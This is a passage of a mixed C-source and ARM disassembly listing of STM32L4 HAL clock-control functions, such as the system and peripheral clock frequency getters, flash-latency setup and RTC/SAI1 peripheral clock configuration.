 800463e:	687b      	ldr	r3, [r7, #4]
 8004640:	fbb2 f3f3 	udiv	r3, r2, r3
 8004644:	617b      	str	r3, [r7, #20]
    pllr = ((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLR) >> RCC_PLLCFGR_PLLR_Pos) + 1U ) * 2U;
 8004646:	4b0a      	ldr	r3, [pc, #40]	; (8004670 <HAL_RCC_GetSysClockFreq+0x108>)
 8004648:	68db      	ldr	r3, [r3, #12]
 800464a:	0e5b      	lsrs	r3, r3, #25
 800464c:	f003 0303 	and.w	r3, r3, #3
 8004650:	3301      	adds	r3, #1
 8004652:	005b      	lsls	r3, r3, #1
 8004654:	603b      	str	r3, [r7, #0]
    sysclockfreq = pllvco / pllr;
 8004656:	697a      	ldr	r2, [r7, #20]
 8004658:	683b      	ldr	r3, [r7, #0]
 800465a:	fbb2 f3f3 	udiv	r3, r2, r3
 800465e:	61bb      	str	r3, [r7, #24]
  }

  return sysclockfreq;
 8004660:	69bb      	ldr	r3, [r7, #24]
}
 8004662:	4618      	mov	r0, r3
 8004664:	3724      	adds	r7, #36	; 0x24
 8004666:	46bd      	mov	sp, r7
 8004668:	f85d 7b04 	ldr.w	r7, [sp], #4
 800466c:	4770      	bx	lr
 800466e:	bf00      	nop
 8004670:	40021000 	.word	0x40021000
 8004674:	0800d4d4 	.word	0x0800d4d4
 8004678:	00f42400 	.word	0x00f42400
 800467c:	007a1200 	.word	0x007a1200

08004680 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 8004680:	b480      	push	{r7}
 8004682:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 8004684:	4b03      	ldr	r3, [pc, #12]	; (8004694 <HAL_RCC_GetHCLKFreq+0x14>)
 8004686:	681b      	ldr	r3, [r3, #0]
}
 8004688:	4618      	mov	r0, r3
 800468a:	46bd      	mov	sp, r7
 800468c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004690:	4770      	bx	lr
 8004692:	bf00      	nop
 8004694:	20000000 	.word	0x20000000

08004698 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 8004698:	b580      	push	{r7, lr}
 800469a:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 800469c:	f7ff fff0 	bl	8004680 <HAL_RCC_GetHCLKFreq>
 80046a0:	4602      	mov	r2, r0
 80046a2:	4b06      	ldr	r3, [pc, #24]	; (80046bc <HAL_RCC_GetPCLK1Freq+0x24>)
 80046a4:	689b      	ldr	r3, [r3, #8]
 80046a6:	0a1b      	lsrs	r3, r3, #8
 80046a8:	f003 0307 	and.w	r3, r3, #7
 80046ac:	4904      	ldr	r1, [pc, #16]	; (80046c0 <HAL_RCC_GetPCLK1Freq+0x28>)
 80046ae:	5ccb      	ldrb	r3, [r1, r3]
 80046b0:	f003 031f 	and.w	r3, r3, #31
 80046b4:	fa22 f303 	lsr.w	r3, r2, r3
}
 80046b8:	4618      	mov	r0, r3
 80046ba:	bd80      	pop	{r7, pc}
 80046bc:	40021000 	.word	0x40021000
 80046c0:	0800d4cc 	.word	0x0800d4cc

080046c4 <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 80046c4:	b580      	push	{r7, lr}
 80046c6:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 80046c8:	f7ff ffda 	bl	8004680 <HAL_RCC_GetHCLKFreq>
 80046cc:	4602      	mov	r2, r0
 80046ce:	4b06      	ldr	r3, [pc, #24]	; (80046e8 <HAL_RCC_GetPCLK2Freq+0x24>)
 80046d0:	689b      	ldr	r3, [r3, #8]
 80046d2:	0adb      	lsrs	r3, r3, #11
 80046d4:	f003 0307 	and.w	r3, r3, #7
 80046d8:	4904      	ldr	r1, [pc, #16]	; (80046ec <HAL_RCC_GetPCLK2Freq+0x28>)
 80046da:	5ccb      	ldrb	r3, [r1, r3]
 80046dc:	f003 031f 	and.w	r3, r3, #31
 80046e0:	fa22 f303 	lsr.w	r3, r2, r3
}
 80046e4:	4618      	mov	r0, r3
 80046e6:	bd80      	pop	{r7, pc}
 80046e8:	40021000 	.word	0x40021000
 80046ec:	0800d4cc 	.word	0x0800d4cc

080046f0 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 80046f0:	b580      	push	{r7, lr}
 80046f2:	b086      	sub	sp, #24
 80046f4:	af00      	add	r7, sp, #0
 80046f6:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 80046f8:	2300      	movs	r3, #0
 80046fa:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 80046fc:	4b2a      	ldr	r3, [pc, #168]	; (80047a8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80046fe:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004700:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004704:	2b00      	cmp	r3, #0
 8004706:	d003      	beq.n	8004710 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 8004708:	f7ff f9a6 	bl	8003a58 <HAL_PWREx_GetVoltageRange>
 800470c:	6178      	str	r0, [r7, #20]
 800470e:	e014      	b.n	800473a <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 8004710:	4b25      	ldr	r3, [pc, #148]	; (80047a8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004712:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004714:	4a24      	ldr	r2, [pc, #144]	; (80047a8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004716:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800471a:	6593      	str	r3, [r2, #88]	; 0x58
 800471c:	4b22      	ldr	r3, [pc, #136]	; (80047a8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 800471e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004720:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004724:	60fb      	str	r3, [r7, #12]
 8004726:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 8004728:	f7ff f996 	bl	8003a58 <HAL_PWREx_GetVoltageRange>
 800472c:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 800472e:	4b1e      	ldr	r3, [pc, #120]	; (80047a8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004730:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004732:	4a1d      	ldr	r2, [pc, #116]	; (80047a8 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 8004734:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004738:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 800473a:	697b      	ldr	r3, [r7, #20]
 800473c:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8004740:	d10b      	bne.n	800475a <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 8004742:	687b      	ldr	r3, [r7, #4]
 8004744:	2b80      	cmp	r3, #128	; 0x80
 8004746:	d919      	bls.n	800477c <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 8004748:	687b      	ldr	r3, [r7, #4]
 800474a:	2ba0      	cmp	r3, #160	; 0xa0
 800474c:	d902      	bls.n	8004754 <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800474e:	2302      	movs	r3, #2
 8004750:	613b      	str	r3, [r7, #16]
 8004752:	e013      	b.n	800477c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004754:	2301      	movs	r3, #1
 8004756:	613b      	str	r3, [r7, #16]
 8004758:	e010      	b.n	800477c <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 800475a:	687b      	ldr	r3, [r7, #4]
 800475c:	2b80      	cmp	r3, #128	; 0x80
 800475e:	d902      	bls.n	8004766 <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 8004760:	2303      	movs	r3, #3
 8004762:	613b      	str	r3, [r7, #16]
 8004764:	e00a      	b.n	800477c <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 8004766:	687b      	ldr	r3, [r7, #4]
 8004768:	2b80      	cmp	r3, #128	; 0x80
 800476a:	d102      	bne.n	8004772 <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 800476c:	2302      	movs	r3, #2
 800476e:	613b      	str	r3, [r7, #16]
 8004770:	e004      	b.n	800477c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 8004772:	687b      	ldr	r3, [r7, #4]
 8004774:	2b70      	cmp	r3, #112	; 0x70
 8004776:	d101      	bne.n	800477c <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004778:	2301      	movs	r3, #1
 800477a:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 800477c:	4b0b      	ldr	r3, [pc, #44]	; (80047ac <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800477e:	681b      	ldr	r3, [r3, #0]
 8004780:	f023 0207 	bic.w	r2, r3, #7
 8004784:	4909      	ldr	r1, [pc, #36]	; (80047ac <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 8004786:	693b      	ldr	r3, [r7, #16]
 8004788:	4313      	orrs	r3, r2
 800478a:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 800478c:	4b07      	ldr	r3, [pc, #28]	; (80047ac <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800478e:	681b      	ldr	r3, [r3, #0]
 8004790:	f003 0307 	and.w	r3, r3, #7
 8004794:	693a      	ldr	r2, [r7, #16]
 8004796:	429a      	cmp	r2, r3
 8004798:	d001      	beq.n	800479e <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 800479a:	2301      	movs	r3, #1
 800479c:	e000      	b.n	80047a0 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 800479e:	2300      	movs	r3, #0
}
 80047a0:	4618      	mov	r0, r3
 80047a2:	3718      	adds	r7, #24
 80047a4:	46bd      	mov	sp, r7
 80047a6:	bd80      	pop	{r7, pc}
 80047a8:	40021000 	.word	0x40021000
 80047ac:	40022000 	.word	0x40022000

080047b0 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 80047b0:	b580      	push	{r7, lr}
 80047b2:	b086      	sub	sp, #24
 80047b4:	af00      	add	r7, sp, #0
 80047b6:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 80047b8:	2300      	movs	r3, #0
 80047ba:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 80047bc:	2300      	movs	r3, #0
 80047be:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 80047c0:	687b      	ldr	r3, [r7, #4]
 80047c2:	681b      	ldr	r3, [r3, #0]
 80047c4:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 80047c8:	2b00      	cmp	r3, #0
 80047ca:	d031      	beq.n	8004830 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 80047cc:	687b      	ldr	r3, [r7, #4]
 80047ce:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80047d0:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 80047d4:	d01a      	beq.n	800480c <HAL_RCCEx_PeriphCLKConfig+0x5c>
 80047d6:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 80047da:	d814      	bhi.n	8004806 <HAL_RCCEx_PeriphCLKConfig+0x56>
 80047dc:	2b00      	cmp	r3, #0
 80047de:	d009      	beq.n	80047f4 <HAL_RCCEx_PeriphCLKConfig+0x44>
 80047e0:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 80047e4:	d10f      	bne.n	8004806 <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 80047e6:	4b5d      	ldr	r3, [pc, #372]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047e8:	68db      	ldr	r3, [r3, #12]
 80047ea:	4a5c      	ldr	r2, [pc, #368]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047ec:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80047f0:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 80047f2:	e00c      	b.n	800480e <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 80047f4:	687b      	ldr	r3, [r7, #4]
 80047f6:	3304      	adds	r3, #4
 80047f8:	2100      	movs	r1, #0
 80047fa:	4618      	mov	r0, r3
 80047fc:	f000 f9de 	bl	8004bbc <RCCEx_PLLSAI1_Config>
 8004800:	4603      	mov	r3, r0
 8004802:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004804:	e003      	b.n	800480e <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 8004806:	2301      	movs	r3, #1
 8004808:	74fb      	strb	r3, [r7, #19]
      break;
 800480a:	e000      	b.n	800480e <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 800480c:	bf00      	nop
    }

    if(ret == HAL_OK)
 800480e:	7cfb      	ldrb	r3, [r7, #19]
 8004810:	2b00      	cmp	r3, #0
 8004812:	d10b      	bne.n	800482c <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 8004814:	4b51      	ldr	r3, [pc, #324]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004816:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800481a:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 800481e:	687b      	ldr	r3, [r7, #4]
 8004820:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004822:	494e      	ldr	r1, [pc, #312]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004824:	4313      	orrs	r3, r2
 8004826:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 800482a:	e001      	b.n	8004830 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 800482c:	7cfb      	ldrb	r3, [r7, #19]
 800482e:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 8004830:	687b      	ldr	r3, [r7, #4]
 8004832:	681b      	ldr	r3, [r3, #0]
 8004834:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004838:	2b00      	cmp	r3, #0
 800483a:	f000 809e 	beq.w	800497a <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 800483e:	2300      	movs	r3, #0
 8004840:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 8004842:	4b46      	ldr	r3, [pc, #280]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004844:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004846:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800484a:	2b00      	cmp	r3, #0
 800484c:	d101      	bne.n	8004852 <HAL_RCCEx_PeriphCLKConfig+0xa2>
 800484e:	2301      	movs	r3, #1
 8004850:	e000      	b.n	8004854 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 8004852:	2300      	movs	r3, #0
 8004854:	2b00      	cmp	r3, #0
 8004856:	d00d      	beq.n	8004874 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8004858:	4b40      	ldr	r3, [pc, #256]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800485a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800485c:	4a3f      	ldr	r2, [pc, #252]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800485e:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8004862:	6593      	str	r3, [r2, #88]	; 0x58
 8004864:	4b3d      	ldr	r3, [pc, #244]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004866:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004868:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800486c:	60bb      	str	r3, [r7, #8]
 800486e:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8004870:	2301      	movs	r3, #1
 8004872:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8004874:	4b3a      	ldr	r3, [pc, #232]	; (8004960 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 8004876:	681b      	ldr	r3, [r3, #0]
 8004878:	4a39      	ldr	r2, [pc, #228]	; (8004960 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800487a:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 800487e:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 8004880:	f7fc fdda 	bl	8001438 <HAL_GetTick>
 8004884:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 8004886:	e009      	b.n	800489c <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8004888:	f7fc fdd6 	bl	8001438 <HAL_GetTick>
 800488c:	4602      	mov	r2, r0
 800488e:	68fb      	ldr	r3, [r7, #12]
 8004890:	1ad3      	subs	r3, r2, r3
 8004892:	2b02      	cmp	r3, #2
 8004894:	d902      	bls.n	800489c <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 8004896:	2303      	movs	r3, #3
 8004898:	74fb      	strb	r3, [r7, #19]
        break;
 800489a:	e005      	b.n	80048a8 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 800489c:	4b30      	ldr	r3, [pc, #192]	; (8004960 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800489e:	681b      	ldr	r3, [r3, #0]
 80048a0:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80048a4:	2b00      	cmp	r3, #0
 80048a6:	d0ef      	beq.n	8004888 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 80048a8:	7cfb      	ldrb	r3, [r7, #19]
 80048aa:	2b00      	cmp	r3, #0
 80048ac:	d15a      	bne.n	8004964 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 80048ae:	4b2b      	ldr	r3, [pc, #172]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048b0:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80048b4:	f403 7340 	and.w	r3, r3, #768	; 0x300
 80048b8:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 80048ba:	697b      	ldr	r3, [r7, #20]
 80048bc:	2b00      	cmp	r3, #0
 80048be:	d01e      	beq.n	80048fe <HAL_RCCEx_PeriphCLKConfig+0x14e>
 80048c0:	687b      	ldr	r3, [r7, #4]
 80048c2:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 80048c4:	697a      	ldr	r2, [r7, #20]
 80048c6:	429a      	cmp	r2, r3
 80048c8:	d019      	beq.n	80048fe <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 80048ca:	4b24      	ldr	r3, [pc, #144]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048cc:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80048d0:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 80048d4:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 80048d6:	4b21      	ldr	r3, [pc, #132]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048d8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80048dc:	4a1f      	ldr	r2, [pc, #124]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048de:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80048e2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 80048e6:	4b1d      	ldr	r3, [pc, #116]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048e8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80048ec:	4a1b      	ldr	r2, [pc, #108]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048ee:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80048f2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 80048f6:	4a19      	ldr	r2, [pc, #100]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048f8:	697b      	ldr	r3, [r7, #20]
 80048fa:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 80048fe:	697b      	ldr	r3, [r7, #20]
 8004900:	f003 0301 	and.w	r3, r3, #1
 8004904:	2b00      	cmp	r3, #0
 8004906:	d016      	beq.n	8004936 <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8004908:	f7fc fd96 	bl	8001438 <HAL_GetTick>
 800490c:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800490e:	e00b      	b.n	8004928 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004910:	f7fc fd92 	bl	8001438 <HAL_GetTick>
 8004914:	4602      	mov	r2, r0
 8004916:	68fb      	ldr	r3, [r7, #12]
 8004918:	1ad3      	subs	r3, r2, r3
 800491a:	f241 3288 	movw	r2, #5000	; 0x1388
 800491e:	4293      	cmp	r3, r2
 8004920:	d902      	bls.n	8004928 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 8004922:	2303      	movs	r3, #3
 8004924:	74fb      	strb	r3, [r7, #19]
            break;
 8004926:	e006      	b.n	8004936 <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004928:	4b0c      	ldr	r3, [pc, #48]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800492a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800492e:	f003 0302 	and.w	r3, r3, #2
 8004932:	2b00      	cmp	r3, #0
 8004934:	d0ec      	beq.n	8004910 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 8004936:	7cfb      	ldrb	r3, [r7, #19]
 8004938:	2b00      	cmp	r3, #0
 800493a:	d10b      	bne.n	8004954 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 800493c:	4b07      	ldr	r3, [pc, #28]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800493e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004942:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 8004946:	687b      	ldr	r3, [r7, #4]
 8004948:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800494a:	4904      	ldr	r1, [pc, #16]	; (800495c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800494c:	4313      	orrs	r3, r2
 800494e:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 8004952:	e009      	b.n	8004968 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 8004954:	7cfb      	ldrb	r3, [r7, #19]
 8004956:	74bb      	strb	r3, [r7, #18]
 8004958:	e006      	b.n	8004968 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 800495a:	bf00      	nop
 800495c:	40021000 	.word	0x40021000
 8004960:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004964:	7cfb      	ldrb	r3, [r7, #19]
 8004966:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004968:	7c7b      	ldrb	r3, [r7, #17]
 800496a:	2b01      	cmp	r3, #1
